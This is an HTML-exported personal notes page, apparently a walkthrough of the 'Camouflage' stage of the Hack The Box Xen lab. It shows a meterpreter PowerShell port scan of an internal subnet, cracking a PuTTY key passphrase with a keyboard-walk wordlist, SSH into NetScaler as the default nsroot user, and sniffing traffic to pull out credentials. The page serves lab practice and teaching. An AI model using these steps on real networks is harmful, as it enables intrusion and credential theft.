<!DOCTYPE html>
<html><head><title>CTFLover hack stuff | CTF solutions</title><base href="./"/><meta id="root-path" root-path="./"/><link href="/images/favicon.jpeg" rel="icon" sizes="96x96"/><meta content="width=device-width,initial-scale=1,user-scalable=yes,minimum-scale=1,maximum-scale=5" name="viewport"/><meta charset="utf-8"/><link href="lib/styles/obsidian-styles.css" rel="stylesheet"/><link href="lib/styles/theme.css" rel="stylesheet"/><link href="lib/styles/plugin-styles.css" rel="stylesheet"/><link href="lib/styles/snippets.css" rel="stylesheet"/><link href="lib/styles/generated-styles.css" rel="stylesheet"/><style></style><script src="lib/scripts/graph_view.js" type="module"></script><script src="lib/scripts/graph_wasm.js"></script><script src="lib/scripts/tinycolor.js"></script><script crossorigin="anonymous" integrity="sha512-Ch/O6kL8BqUwAfCF7Ie5SX1Hin+BJgYH4pNjRqXdTEqMsis1TUYg+j6nnI9uduPjGaj7DN4UKCZgpvoExt6dkw==" referrerpolicy="no-referrer" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js"></script><script src="lib/scripts/webpage.js"></script><script src="lib/scripts/generated.js"></script></head><body class="theme-dark mod-linux show-inline-title loading"><div class="webpage-container"><div class="sidebar-left sidebar"><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" id="theme_toggle" type="checkbox"/><div class="toggle-background"></div></label></div><div class="tree-container file-tree mod-nav-indicator" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Xen</span><button class="clickable-icon collapse-tree-button is-collapsed"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="05-nmap.html"><span class="tree-item-title">05-Nmap</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="10-enumeration.html"><span class="tree-item-title">10-Enumeration</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="15-smtp.html"><span class="tree-item-title">15-SMTP</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="20-citrix.html"><span class="tree-item-title">20-Citrix</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="25-getting-shell.html"><span class="tree-item-title">25-Getting Shell</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="30-deploy.html"><span class="tree-item-title">30-Deploy</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="35-ghost.html"><span class="tree-item-title">35-Ghost</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="40-camouflage.html"><span class="tree-item-title">40-Camouflage</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="45-doppelgänger.html"><span class="tree-item-title">45-Doppelgänger</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="50-owned.html"><span class="tree-item-title">50-Owned</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="creds.html"><span class="tree-item-title">creds</span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div></div><div class="document-container show"><div class="markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings show-indentation-guide allow-fold-lists show-properties" style="tab-size:4" tabindex="-1"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="markdown-preview-pusher" style="width:1px;height:.1px;margin-bottom:0"></div><div class="mod-header"><div class="inline-title" data-heading="40-Camouflage" id="40-Camouflage" style="display:block">40-Camouflage</div></div><div><pre class="language-powershell" tabindex="0"><code class="language-powershell is-loaded">meterpreter &gt; load powershell
Loading extension powershell<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Success<span class="token punctuation">.</span>
meterpreter &gt; powershell_import <span class="token function">Invoke-Portscan</span><span class="token punctuation">.</span>ps1                                                                                             
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> File successfully imported<span class="token punctuation">.</span> No result was returned<span class="token punctuation">.</span>
meterpreter &gt; powershell_s
powershell_session_remove  powershell_shell           
meterpreter &gt; powershell_shell 
<span class="token function">PS</span> &gt; <span class="token function">Invoke-Portscan</span> <span class="token operator">-</span>Hosts 172<span class="token punctuation">.</span>16<span class="token punctuation">.</span>249<span class="token punctuation">.</span>0/24 <span class="token operator">-</span>T 4 <span class="token operator">-</span>TopPorts 25 <span class="token operator">-</span>oA localne
</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240121222148.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121222148.png"><img alt="Pasted image 20240121222148.png" src="pasted-image-20240121222148.png"/></span></p></div><div><p>I got response on 172.16.249.202,</p></div><div><p>Made the request from the citrix receiver session.<br/><span alt="Pasted image 20240121222407.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121222407.png"><img alt="Pasted image 20240121222407.png" src="pasted-image-20240121222407.png"/></span></p></div><div><p>Logged in with <code>mturner:4install!</code><br/><span alt="Screenshot_2024-01-21_22_25_12.png" class="internal-embed media-embed image-embed is-loaded" src="screenshot_2024-01-21_22_25_12.png"><img alt="Screenshot_2024-01-21_22_25_12.png" src="screenshot_2024-01-21_22_25_12.png"/></span></p></div><div><p>Found that citrix netscaler has a default username of nsroot, I ll try this later in ssh apart from that did not find much, I moved on to ssh.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">sudo apt install putty-tools
putty2john private.ppk &gt; john
</code><button class="copy-code-button">Copy</button></pre></div><div><p>I was not able to crack it with john. I tried with many wordlists but no luck.</p></div><div><p>0xdf's writeup helped me to find hashcat's <a aria-label="https://github.com/hashcat/kwprocessor" class="external-link" data-tooltip-position="top" href="https://github.com/hashcat/kwprocessor" rel="noopener" target="_blank">kwprocessor</a></p></div><div><p>Its an Advanced keyboard-walk generator with configureable basechars, keymap and routes</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">git clone https://github.com/hashcat/kwprocessor.git
cd kwprocessor
make
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Creating a wordlist</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  kwprocessor git:(master) ✗ ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route &gt; ~/Desktop/ctf/htb-EndGames/Xen/hashcat.out

</code><button class="copy-code-button">Copy</button></pre></div><div><p>The wordlist looks kind of scary<br/><span alt="Pasted image 20240121224524.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121224524.png"><img alt="Pasted image 20240121224524.png" src="pasted-image-20240121224524.png"/></span></p></div><div><p>anyways lets try to crack it with this</p></div><div><p>It was quick.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Xen john john --wordlist=wordlist 
Using default input encoding: UTF-8
Loaded 1 password hash (PuTTY, Private Key (RSA/DSA/ECDSA/ED25519) [SHA1/AES 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
=-09876567890-=- (private)     
1g 0:00:00:00 DONE (2024-01-21 22:46) 8.333g/s 546133p/s 546133c/s 546133C/s -[..-09876543212345tg
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Xen puttygen private.ppk -O private-openssh -o private.pem
Enter passphrase to load key: 
➜  Xen chmod 600 privat.pem
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Previously i discovered the default user to be nsroot, I ll try it.<br/>Got a shell.<br/><span alt="Pasted image 20240121230540.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121230540.png"><img alt="Pasted image 20240121230540.png" src="pasted-image-20240121230540.png"/></span></p></div><div><p><span alt="Pasted image 20240121230749.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121230749.png"><img alt="Pasted image 20240121230749.png" src="pasted-image-20240121230749.png"/></span></p></div><div><p>After tinkering here and there I found nothing of interest so I decided to capture logs.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">tcpdump -i 1 -w hello.pcap -s 0 'not tcp port 22' &amp;

</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240121231651.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121231651.png"><img alt="Pasted image 20240121231651.png" src="pasted-image-20240121231651.png"/></span></p></div><div><p>Opened the pcap in wireshark.<br/><span alt="Pasted image 20240121232230.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121232230.png"><img alt="Pasted image 20240121232230.png" src="pasted-image-20240121232230.png"/></span></p></div><div><p>I saw a Post request which had a flag in password<br/><span alt="Pasted image 20240121232400.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121232400.png"><img alt="Pasted image 20240121232400.png" src="pasted-image-20240121232400.png"/></span></p></div><div><p>I was not able to get anything else so i used strings on the pcap file with -n 10 for minimum length.</p></div><div><p><code>strings hello.pcap -n 10</code><br/><span alt="Pasted image 20240121233633.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240121233633.png"><img alt="Pasted image 20240121233633.png" src="pasted-image-20240121233633.png"/></span><br/><code>#S3rvice#@cc</code> That look like a password.</p></div><div class="mod-footer"></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder"><div class="graph-view-container"><div aria-label="Expand" class="graph-icon graph-expand" data-tooltip-position="top" role="button"><svg class="svg-icon" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><line x1="7" x2="17" y1="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div><canvas height="512px" id="graph-canvas" width="512px"></canvas></div></div></div><div class="tree-container outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"></div></div></div></div></div></div></div></div></body></html>